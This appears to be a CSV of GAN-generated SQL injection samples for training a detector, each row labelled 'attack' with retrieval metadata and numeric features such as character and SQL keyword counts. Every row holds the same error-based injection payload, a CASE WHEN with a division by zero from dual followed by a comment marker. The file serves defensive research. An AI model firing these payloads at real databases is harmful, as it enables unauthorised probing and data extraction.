id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000197,attack,error,select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000026,4.854747178238839,137.2891845703125,46.891510009765625,22.367752075195312,50.93339538574219,0.7552761435508728,47.54587936401367,15.156487464904785,1.0093828439712524,0.35383230447769165,0.15138313174247742,0.3744172155857086,0.10615899413824081,3.7431933879852295,0.5277538299560547,0.06579175591468811,0.8961870670318604,0.07997828722000122,0.5530303716659546,-0.13760040700435638,4.534072399139404,4.491744041442871,2.1956818103790283,0.14128589630126953,0.9731729030609131,0.032033756375312805,0.07538557052612305,-0.07966607809066772,0.000360880047082901,0.06664928048849106,0.2161104679107666,-0.12298259884119034,1.5418272018432617,-0.10735934972763062,0.48791852593421936,1.0617725849151611,3.382215738296509,0.07711867988109589,1.5070937871932983,-0.03606657683849335,0.019194426015019417,0.8986334800720215,0.11838772892951965,0.06514708697795868,0.0077191367745399475,0.13963796198368073,0.06247871369123459,0.4294716715812683,0.4054636061191559,0.5505955219268799,0.4049425423145294,0.6502991318702698,0.08832370489835739,-0.03306937590241432,-0.012402883730828762,0.03192058205604553,0.11592160165309906,0.0014989972114562988,-0.1258435696363449,0.24662554264068604,-0.02286747843027115,0.02903556078672409,0.04178667813539505,0.12126122415065765,0.6109868884086609,0.07443894445896149,0.31464052200317383,0.038834139704704285,-0.21537698805332184,0.018388502299785614,0.005737312138080597,-0.01708916388452053,-0.11199358105659485,0.006117433309555054,0.016125882044434547,0.02081836760044098,0.2875314950942993,0.1616201549768448,0.0985143780708313,-0.04163068160414696,0.012896612286567688,7.141413688659668,0.08904435485601425,0.052779749035835266,0.05871579051017761,0.5972493290901184,-0.011539915576577187,0.13274727761745453,0.10971623659133911
GAN_000198,attack,error,select   (  case when   (  8841  =  9675  )   then 8841 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000038,4.730258271994016,136.7147674560547,48.11225128173828,21.10895538330078,51.13906478881836,1.8737012147903442,48.179649353027344,14.894392013549805,1.0723143815994263,0.3580016791820526,0.15404918789863586,0.3741329610347748,0.10689122974872589,3.7595067024230957,0.4344837963581085,0.07737001031637192,0.8298935890197754,0.026088928803801537,0.5696487426757812,0.09986019879579544,4.361134052276611,4.522646903991699,2.57698655128479,0.1405387818813324,0.9932557344436646,-0.06801337003707886,0.06606359779834747,0.06245766580104828,0.006012976635247469,0.04019194096326828,0.16323259472846985,-0.06344859302043915,1.5103859901428223,0.001546427607536316,0.4977400600910187,0.9755635261535645,3.3385915756225586,0.047983523458242416,1.4143760204315186,0.019275382161140442,0.002165905898436904,0.990394651889801,0.038547489792108536,0.07319208234548569,-0.1855446994304657,0.18036524951457977,-0.028066299855709076,0.5383811593055725,0.4290888011455536,0.4857556223869324,0.48549574613571167,0.578236997127533,-0.08171401172876358,-0.12958544492721558,0.01631293259561062,0.025341466069221497,-0.06041976436972618,-0.03944184631109238,0.07190217822790146,0.1130853071808815,-0.16046833992004395,0.15442082285881042,0.039440423250198364,0.018296662718057632,0.5125846266746521,-0.16829520463943481,0.24099089205265045,-0.04375692456960678,0.04032513126730919,-0.010450303554534912,0.07881227135658264,0.06350911408662796,-0.047141339629888535,0.09697982668876648,0.031615812331438065,0.009388672187924385,0.29895201325416565,0.1385072022676468,0.16290104389190674,-0.0806894525885582,-0.06739916652441025,6.711888790130615,0.07617602497339249,0.145741268992424,0.023563005030155182,0.5342133641242981,-0.034201640635728836,0.1659797728061676,0.02731712907552719
GAN_000199,attack,error,select   (  case when   (  7997  =  1543  )   then 7997 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000021,4.801964285626554,136.64984130859375,48.309974670410156,21.041162490844727,51.02617263793945,1.4391231536865234,46.53204345703125,14.891033172607422,0.9929852485656738,0.3602311313152313,0.15164777636528015,0.373822420835495,0.1065201461315155,3.7341482639312744,0.44116613268852234,0.08066506683826447,0.8963048458099365,0.022401100024580956,0.5018889904022217,0.013845643028616905,4.353603363037109,4.611640453338623,2.6174206733703613,0.22603221237659454,1.0077556371688843,-0.09490802884101868,0.014929798431694508,-0.046943940222263336,0.013554427772760391,-0.005874738097190857,0.11773494631052017,0.03192941099405289,1.5122370719909668,-0.05463253706693649,0.5235965847969055,0.9678027629852295,3.3599181175231934,0.08366863429546356,1.4649488925933838,0.011726796627044678,0.002213370753452182,0.9904910326004028,-0.033546969294548035,0.07486966997385025,-0.061692919582128525,0.07926857471466064,-0.01378098875284195,0.47825324535369873,0.4195272922515869,0.4708711504936218,0.431509792804718,0.580689013004303,-0.0031868144869804382,0.009323768317699432,0.01643013022840023,0.040830694139003754,0.05601979047060013,-0.007576322183012962,0.039183907210826874,0.15529583394527435,-0.044636912643909454,0.01827114075422287,0.017312750220298767,0.004330947995185852,0.5872186422348022,-0.028253981843590736,0.33033961057662964,-0.02519497275352478,-0.06669315695762634,0.09484022855758667,0.006616055965423584,-0.0963197574019432,-0.07355943322181702,-0.0026479214429855347,0.019093582406640053,0.016391105949878693,0.3672243356704712,0.1805540770292282,0.16423504054546356,-0.1366318315267563,0.053953010588884354,6.710438251495361,0.09536408632993698,0.08857743442058563,0.04527883976697922,0.511962890625,-0.02694857493042946,0.07105663418769836,0.011619552969932556
GAN_000200,attack,error,select   (  case when   (  3539  =  8768  )   then 3539 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000078,4.804130347666557,136.4807891845703,47.33120346069336,19.418243408203125,50.247432708740234,3.1120762825012207,48.59962844848633,15.329645156860352,1.0198078155517578,0.3388393819332123,0.16042985022068024,0.37171828746795654,0.10731182247400284,3.7657630443573,0.3215138018131256,0.04487188905477524,0.736340343952179,0.020210115239024162,0.5733018517494202,-0.06860082596540451,4.375749111175537,4.374090194702148,1.8526860475540161,0.22416526079177856,0.9806759357452393,-0.035132743418216705,0.13274431228637695,0.05676216632127762,0.0063374238088727,0.0618724450469017,0.25488007068634033,0.0044464245438575745,1.4541066884994507,-0.021357808262109756,0.47148483991622925,0.9435418844223022,3.2808008193969727,-0.005357380025088787,1.3939071893692017,-0.0013792701065540314,0.01215319987386465,1.0366871356964111,0.13676229119300842,0.039799679070711136,-0.10811421275138855,0.13275252282619476,0.06508684903383255,0.4388696551322937,0.387747585773468,0.48381707072257996,0.4148329198360443,0.6168469786643982,-0.050944603979587555,-0.03467746451497078,0.027992824092507362,-0.10432493686676025,-0.08701473474502563,-0.0013437345623970032,-0.007806114852428436,0.13391754031181335,-0.08704458922147751,0.09326530247926712,0.0406855046749115,0.029642116278409958,0.6321237683296204,-0.002269372344017029,0.22779490053653717,-0.023731082677841187,-0.08929514139890671,-0.13272732496261597,-0.010375447571277618,-0.0811297670006752,-0.13253669440746307,-0.08335617929697037,0.01982833817601204,0.02692090906202793,0.33186087012290955,0.06383782625198364,0.11128979176282883,-0.010018104687333107,0.07022689282894135,7.014221668243408,0.09440629929304123,0.03374466300010681,0.035023219883441925,0.5869693756103516,-0.04906156659126282,0.14955148100852966,0.015080474317073822
GAN_000201,attack,error,select   (  case when   (  6804  =  7050  )   then 6804 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000065,4.912363647011571,136.12203979492188,47.28133773803711,19.586742401123047,49.735591888427734,1.1602071523666382,50.011444091796875,15.40298080444336,0.9992319941520691,0.3400214612483978,0.1636980175971985,0.37512367963790894,0.10472868382930756,3.7373135089874268,0.36083582043647766,0.04930497333407402,0.7098435759544373,-0.01665470190346241,0.4818142354488373,-0.24822849035263062,4.434833526611328,4.4844207763671875,1.5080406665802002,0.07925695180892944,0.9614992737770081,-0.05762059614062309,-0.014003492891788483,-0.012592852115631104,-0.07961894571781158,-0.17560480535030365,0.21950653195381165,0.12496020644903183,1.4243682622909546,-0.1273147612810135,0.5155447125434875,1.0046417713165283,3.2960047721862793,0.09582985192537308,1.4561182260513306,0.16596662998199463,-0.0006709221634082496,0.9637446403503418,0.029065057635307312,0.07013452798128128,-0.051496028900146484,0.1900622546672821,0.1557011604309082,0.4837953448295593,0.34690454602241516,0.4744991660118103,0.38395777344703674,0.599891722202301,-0.1422773003578186,-0.04055231064558029,0.07219719141721725,0.037051521241664886,-0.050772737711668015,-0.0008375085890293121,-0.07813660055398941,0.4416459798812866,-0.07760269194841385,0.19542360305786133,-0.02857624739408493,0.11229999363422394,0.8137615919113159,0.032061219215393066,0.32451605796813965,0.06924207508563995,-0.27344250679016113,-0.27331066131591797,0.14108394086360931,-0.09263886511325836,0.026358818635344505,-0.14901429414749146,0.014202509075403214,0.011785193346440792,0.25787463784217834,0.13952842354774475,0.16768133640289307,-0.06419101357460022,-0.11342642456293106,6.1552629470825195,0.10554498434066772,0.08079807460308075,0.027809862047433853,0.6352277994155884,0.03898538276553154,-0.14178556203842163,0.0701073408126831
GAN_000202,attack,error,select   (  case when   (  1812  =  2446  )   then 1812 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000046,4.944619609480126,135.80128479003906,49.08903503417969,20.513769149780273,50.07722473144531,1.773886799812317,46.30116653442383,14.993728637695312,1.2270172834396362,0.3566203713417053,0.15665936470031738,0.37449660897254944,0.10477784276008606,3.7139601707458496,0.38372519612312317,0.03501560539007187,0.8533546328544617,0.03242713212966919,0.5257426500320435,-0.07728133350610733,4.369082927703857,4.54688024520874,2.3397345542907715,0.2204541265964508,1.001767635345459,-0.08345621824264526,-0.006657810881733894,0.18452024459838867,0.025886178016662598,-0.12700851261615753,0.20281636714935303,0.10913742333650589,1.5352468490600586,0.10404206812381744,0.5909748077392578,1.010751485824585,3.27323317527771,0.055760085582733154,1.4260703325271606,0.041153036057949066,0.0018425945891067386,0.9040237069129944,-0.038492269814014435,0.05063432455062866,-0.25380149483680725,0.10783372074365616,-0.059164226055145264,0.45919269323349,0.4134215712547302,0.41371574997901917,0.3668014109134674,0.50965815782547,-0.2157251238822937,-0.022191353142261505,0.13512346148490906,0.018666863441467285,-0.030201423913240433,-0.06490565836429596,0.06821451336145401,0.15525488555431366,-0.0666835680603981,0.17494726181030273,0.20551761984825134,0.08392681181430817,0.6304973363876343,-0.016887806355953217,0.39377862215042114,-0.25014203786849976,-0.12255227565765381,-0.1294216513633728,0.20192964375019073,-0.1542629897594452,-0.12266327440738678,-0.0066449567675590515,0.01411853265017271,0.015488105826079845,0.37187841534614563,0.22116944193840027,0.11827047169208527,-0.1805107444524765,-0.06531431525945663,6.314176559448242,0.06736807525157928,0.1477842628955841,0.05599753186106682,0.5497646927833557,-0.15793739259243011,-0.02981824055314064,0.007716327905654907
GAN_000203,attack,error,select   (  case when   (  8841  =  9675  )   then 8841 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000038,4.8249873855153576,135.62791442871094,47.120174407958984,20.42816162109375,50.96861267089844,1.1788495779037476,48.657291412353516,15.035770416259766,0.8632026314735413,0.3434281051158905,0.15828222036361694,0.3751406669616699,0.10315372794866562,3.757199287414551,0.34182798862457275,0.07771836966276169,0.836047887802124,0.04051690176129341,0.5654805302619934,0.049314312636852264,4.344418048858643,4.736616611480713,2.21767258644104,0.17650768160820007,0.9590631127357483,0.051556073129177094,0.009684570133686066,0.05211848393082619,0.12850187718868256,-0.014209702610969543,0.22023561596870422,0.015301495790481567,1.510725975036621,-0.12232640385627747,0.5576332807540894,0.9437432289123535,3.3523826599121094,0.06942753493785858,1.408805012702942,0.04057271033525467,-0.0074941301718354225,1.0440477132797241,-0.030996806919574738,0.07755675911903381,-0.08064310252666473,0.044296666979789734,0.19983229041099548,0.4503340721130371,0.4805259108543396,0.49201563000679016,0.41247987747192383,0.5027226805686951,0.21353289484977722,-0.09878470003604889,-0.14366257190704346,0.10027696192264557,0.08522611111402512,0.04359244182705879,-0.19391533732414246,0.12185325473546982,0.004235453903675079,-0.07057198137044907,0.034772418439388275,-0.039735306054353714,0.6446051597595215,-0.0590825080871582,0.2993188500404358,-0.011606663465499878,-0.17368105053901672,0.038588955998420715,0.04488597810268402,-0.12255418300628662,-0.15214280784130096,-0.05088870972394943,0.0033585603814572096,0.007572426926344633,0.45114660263061523,0.17243851721286774,0.1812075972557068,0.037469543516635895,0.020144738256931305,6.326208114624023,0.08588460832834244,0.01185036450624466,0.034135036170482635,0.5864341259002686,0.0981060266494751,0.014863349497318268,-0.02210637927055359
GAN_000204,attack,error,select   (  case when   (  6804  =  7050  )   then 6804 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000065,4.873825378452636,136.1587371826172,46.545345306396484,19.61634063720703,50.21807098388672,2.2395823001861572,48.556434631347656,15.130105018615723,0.9079718589782715,0.3402809202671051,0.16171057522296906,0.3710453510284424,0.10409515351057053,3.7384583950042725,0.27063971757888794,0.023959744721651077,0.6938363313674927,0.033837463706731796,0.5005223155021667,-0.19945982098579407,4.362125396728516,4.666914463043213,1.4921571016311646,0.17875510454177856,1.0105527639389038,0.023780295625329018,-0.061580121517181396,0.10423386096954346,0.058424364775419235,-0.1271962970495224,0.2144542634487152,0.06776536256074905,1.447842001914978,-0.07427160441875458,0.5274502635002136,1.0222547054290771,3.32271409034729,0.08492402732372284,1.4010372161865234,0.014718353748321533,0.0025922709610313177,1.0901767015457153,-0.00371367484331131,0.052648305892944336,-0.03169667720794678,0.06451993435621262,0.13549256324768066,0.4032875597476959,0.4340607523918152,0.46241235733032227,0.41214820742607117,0.5313006639480591,-0.0366181954741478,-0.004532895982265472,0.10450709611177444,0.08519953489303589,-0.17090214788913727,-0.02082110196352005,-0.13127446174621582,0.26359477639198303,0.019064992666244507,0.030267469584941864,0.1621657758951187,0.02966621145606041,0.7254799008369446,0.06721995770931244,0.3739210367202759,-0.08195222914218903,-0.23056308925151825,-0.12898504734039307,0.1037701889872551,-0.13304442167282104,-0.041936542838811874,-0.17044568061828613,-0.005771585740149021,0.02209099568426609,0.385709673166275,0.1713799089193344,0.04326309636235237,0.029462816193699837,0.12586671113967896,6.582796096801758,0.09386767446994781,0.12468191981315613,0.07301675528287888,0.5082564353942871,-0.1115778386592865,-0.10846590995788574,0.0465962290763855
GAN_000205,attack,error,select   (  case when   (  3539  =  8768  )   then 3539 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000078,4.958013961042462,135.87901306152344,47.4844970703125,18.285120010375977,50.59130096435547,1.0521506071090698,48.860206604003906,15.464679718017578,0.9954589605331421,0.34785526990890503,0.16262833774089813,0.3713167607784271,0.10780502110719681,3.7624001502990723,0.37481755018234253,0.05913369730114937,0.6219863295555115,-0.0009933209512382746,0.5773903727531433,-0.014104983769357204,4.40500545501709,4.470042705535889,2.1195404529571533,0.05910560488700867,0.9887673854827881,-0.05678372457623482,-0.07407127320766449,-0.18194477260112762,-0.23686110973358154,0.1155710443854332,0.19602355360984802,0.04183121770620346,1.3438222408294678,-0.24608124792575836,0.5409113168716431,0.9631161689758301,3.389908790588379,0.004977998323738575,1.4680880308151245,0.07262580841779709,-0.0023692010436207056,0.9984881281852722,-0.0804874375462532,0.05772387981414795,-0.19731900095939636,0.31717586517333984,0.12078555673360825,0.44717201590538025,0.33850574493408203,0.46338731050491333,0.3608163297176361,0.6142617464065552,-0.027043871581554413,-0.07540200650691986,0.13548104465007782,-0.13869519531726837,-0.2790634334087372,-0.2201167196035385,0.13519737124443054,0.2624230980873108,-0.034958526492118835,0.21844235062599182,-0.04023387283086777,0.12795142829418182,0.6004536747932434,-0.09579100459814072,0.24448883533477783,0.17691795527935028,-0.11024056375026703,-0.08042386919260025,0.05023432523012161,0.16937744617462158,0.1334271878004074,0.07046149671077728,0.034143805503845215,0.002084252191707492,0.3302038609981537,0.133620947599411,0.13325369358062744,-0.19146274030208588,0.0694829672574997,6.833106994628906,0.12739528715610504,0.02056819200515747,0.0558464415371418,0.5773481726646423,0.03195134922862053,0.32353338599205017,0.07520309090614319
GAN_000206,attack,error,select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000026,4.739385792574593,136.78790283203125,47.39466094970703,22.221017837524414,51.008338928222656,1.4977589845657349,46.666812896728516,14.82395076751709,0.8929730653762817,0.3546190559864044,0.14938905835151672,0.3725033402442932,0.10687661916017532,3.7419753074645996,0.4254772365093231,0.04792127013206482,0.9081071615219116,0.025157971307635307,0.5402024984359741,-0.0335751511156559,4.370692253112793,4.624712944030762,2.504638195037842,0.1285540610551834,1.0025562047958374,-0.001680232584476471,0.01901303604245186,0.07216626405715942,0.08284719288349152,0.0725221186876297,0.0906684622168541,-0.08990630507469177,1.4055814743041992,-0.03567630425095558,0.49981340765953064,1.0392343997955322,3.394139289855957,0.0932154580950737,1.4363535642623901,-0.11095666885375977,0.010184206068515778,1.0547698736190796,0.101244255900383,0.05438068136572838,-0.04816259816288948,0.17102691531181335,-0.013557136058807373,0.4786490797996521,0.4435015320777893,0.4953320324420929,0.4545800983905792,0.5789817571640015,0.033638544380664825,-0.03614123910665512,0.025490127503871918,0.08523301780223846,0.050216566771268845,0.042217884212732315,-0.12608589231967926,0.20548033714294434,-0.013432115316390991,-0.017397277057170868,0.036639489233493805,0.02211015298962593,0.5798227787017822,0.006211668252944946,0.319791704416275,-0.05476516857743263,-0.07510676980018616,0.05795765668153763,0.019063368439674377,-0.07969818264245987,-0.050205301493406296,-0.04737960547208786,0.008258434012532234,0.0175973828881979,0.380588173866272,0.15470770001411438,0.12179514765739441,-0.03317759558558464,0.009697139263153076,6.956480026245117,0.07803762704133987,0.10491921007633209,0.059039581567049026,0.49190935492515564,-0.0964365229010582,0.008378881961107254,0.017230264842510223
GAN_000207,attack,error,select   (  case when   (  5847  =  2826  )   then 5847 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000076,4.945402353488416,136.05947875976562,46.32670593261719,19.78702163696289,50.45793914794922,1.684686541557312,51.08502960205078,15.299711227416992,0.8867059946060181,0.34847307205200195,0.16178280115127563,0.37227126955986023,0.10673686116933823,3.776491165161133,0.36284688115119934,0.011466612108051777,0.5960139036178589,0.007407618220895529,0.5216171145439148,-0.12020476907491684,4.486850738525391,4.636473655700684,1.81692373752594,0.22042423486709595,0.9471887946128845,-0.08459345996379852,-0.07814209908246994,-0.14198890328407288,-0.16755034029483795,-0.07189115881919861,0.28954505920410156,-0.014610983431339264,1.5551520586013794,-0.23673032224178314,0.5423053503036499,0.9671515226364136,3.4316654205322266,0.06266792863607407,1.4582958221435547,0.10928075760602951,0.005563794169574976,1.0071841478347778,-0.04826151579618454,0.04299104958772659,-0.03514803200960159,0.20002712309360504,0.16788437962532043,0.39202451705932617,0.450119286775589,0.5508861541748047,0.37218984961509705,0.5327106714248657,0.10012470185756683,-0.14521300792694092,0.0031628517899662256,-0.11692474782466888,-0.0879586935043335,-0.11146093904972076,-0.08097141236066818,0.3593165874481201,-0.04688941314816475,0.16405317187309265,0.07902792096138,-0.028219113126397133,0.6643587946891785,0.060067154467105865,0.22002604603767395,0.17000509798526764,-0.25044772028923035,-0.11692746728658676,-0.024016685783863068,0.08497593551874161,0.010319199413061142,-0.11869775503873825,0.006649792660027742,0.0009967813966795802,0.2987974286079407,0.16029001772403717,0.1915278136730194,0.046668194234371185,0.04871370270848274,6.801376819610596,0.16100375354290009,0.01670270413160324,0.04833250865340233,0.6002784967422485,0.08977213501930237,0.18796326220035553,0.1598130762577057
GAN_000208,attack,error,select   (  case when   (  1724  =  6528  )   then 1724 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000029,5.139167190485652,135.47665405273438,48.1558723449707,19.34168815612793,50.61931228637695,0.7226510643959045,49.89149856567383,15.525436401367188,0.9275784492492676,0.3265345096588135,0.1602378785610199,0.371349036693573,0.10251376032829285,3.7680323123931885,0.43851450085639954,0.04154864698648453,0.7221546769142151,0.027544157579541206,0.5164502859115601,-0.1320132315158844,4.502986431121826,4.739439487457275,2.0679337978363037,0.04506705328822136,0.9302974343299866,-0.16590997576713562,-0.05391082912683487,-0.07263605296611786,-0.19781334698200226,-0.10822410881519318,0.3733203113079071,0.10008101910352707,1.5113333463668823,-0.17947980761528015,0.6338430643081665,0.9381890892982483,3.367985248565674,0.040200553834438324,1.3882975578308105,0.16018876433372498,-0.0031112630385905504,1.0320744514465332,-0.1428709328174591,0.04877617582678795,-0.0740790069103241,0.22146445512771606,0.2326107919216156,0.32900533080101013,0.46067529916763306,0.5597772002220154,0.25009530782699585,0.5226924419403076,0.3508979380130768,-0.1632091999053955,-0.0683165118098259,-0.10463450849056244,0.028808219358325005,-0.07355082780122757,-0.09211203455924988,0.3375962972640991,0.12488488852977753,0.04980779439210892,0.17765752971172333,-0.03281085565686226,0.6808598041534424,0.034437596797943115,0.33635520935058594,-0.09245594590902328,-0.3442820906639099,-0.18685156106948853,-0.005341976881027222,0.043999265879392624,-0.07527656853199005,-0.014599896967411041,-0.0033661082852631807,7.882418140070513e-05,0.4593837261199951,0.21875371038913727,0.07926040142774582,-0.17005430161952972,0.10254804790019989,6.536221981048584,0.14199644327163696,0.1081424355506897,0.05476801097393036,0.6271070241928101,0.15228720009326935,0.16454429924488068,0.024248063564300537
GAN_000209,attack,error,select   (  case when   (  9103  =  9836  )   then 9103 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000066,4.814403553517109,136.22218322753906,49.33113479614258,20.451478958129883,50.462276458740234,1.9252402782440186,46.57534408569336,14.916842460632324,1.1918407678604126,0.35369396209716797,0.14905953407287598,0.37322714924812317,0.10461197793483734,3.727189779281616,0.472520112991333,0.06039189174771309,0.8579903244972229,0.00018264888785779476,0.4664373993873596,-0.07175750285387039,4.46643590927124,4.506133079528809,2.525007724761963,0.14685335755348206,0.9837785363197327,-0.10735853016376495,0.12838365137577057,0.11212556064128876,-0.02333810180425644,-0.07655590772628784,0.18628409504890442,0.10247280448675156,1.5466187000274658,0.08166590332984924,0.5290592312812805,0.9927218556404114,3.2750844955444336,0.030375130474567413,1.4530377388000488,0.017402753233909607,0.02234799601137638,1.0377956628799438,0.05372922122478485,0.05755137652158737,-0.10659375041723251,0.12616050243377686,-0.06048130616545677,0.4801248610019684,0.40930941700935364,0.4664178490638733,0.39257556200027466,0.5967482328414917,-0.08565358072519302,-0.00706973671913147,0.14402668178081512,-0.009674027562141418,0.04881908744573593,-0.11012612283229828,0.0885496661067009,0.23588696122169495,-0.11022000014781952,0.22550860047340393,0.11063585430383682,-0.018367893993854523,0.650347888469696,0.03861404210329056,0.36189666390419006,-0.10494788736104965,-0.07723145931959152,-0.15142101049423218,0.04532796889543533,-0.15883372724056244,-0.1245729923248291,-0.05128557235002518,0.016474537551403046,0.0160458292812109,0.27771326899528503,0.16370485723018646,0.11473986506462097,-0.2114749401807785,-0.007037684321403503,6.495181083679199,0.08567000180482864,0.12768752872943878,0.039036162197589874,0.5484858155250549,-0.12358081340789795,0.014801617711782455,0.041843757033348083
GAN_000210,attack,error,select   (  case when   (  1724  =  6528  )   then 1724 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000029,4.760577230372613,136.13589477539062,49.46429443359375,19.883949279785156,50.918663024902344,2.099850654602051,47.75724411010742,14.913171768188477,1.0623629093170166,0.34932249784469604,0.14695805311203003,0.3729504644870758,0.10442615300416946,3.771244764328003,0.4386236071586609,0.130461186170578,0.800621747970581,-0.04447741433978081,0.5311741232872009,-0.03163422644138336,4.48805570602417,4.52410364151001,2.708632230758667,0.13710543513298035,0.9702379703521729,-0.1460561603307724,0.1668703556060791,-0.13726970553398132,-0.10828925669193268,0.03131874278187752,0.14403721690177917,0.108858622610569,1.4786401987075806,-0.12246756255626678,0.5201974511146545,0.9181839227676392,3.242260217666626,0.02423948049545288,1.4591047763824463,-0.03623281046748161,0.024798553436994553,1.0937801599502563,-0.05827680975198746,0.05285308137536049,-0.14695358276367188,0.14675933122634888,-0.05696900933980942,0.5187257528305054,0.38037368655204773,0.5294252038002014,0.41466379165649414,0.6901552677154541,-0.12344297021627426,0.09403087943792343,0.2407621145248413,-0.013628289103507996,-0.04327603802084923,-0.1283663660287857,0.3070570230484009,0.26525911688804626,-0.07286818325519562,0.25431591272354126,-0.09219906479120255,0.0026059895753860474,0.5553041100502014,0.004399485886096954,0.18111474812030792,0.06962104141712189,-0.03290722519159317,0.018512070178985596,-0.07586796581745148,-0.02529282309114933,-0.02125813439488411,-0.03363993018865585,0.027801504358649254,0.0028919035103172064,0.29905936121940613,0.123509481549263,0.15548157691955566,-0.4072992205619812,0.019545570015907288,6.521960258483887,0.1210574135184288,0.12844115495681763,0.039000291377305984,0.5548676252365112,-0.011679435148835182,0.23483453691005707,0.2411384880542755
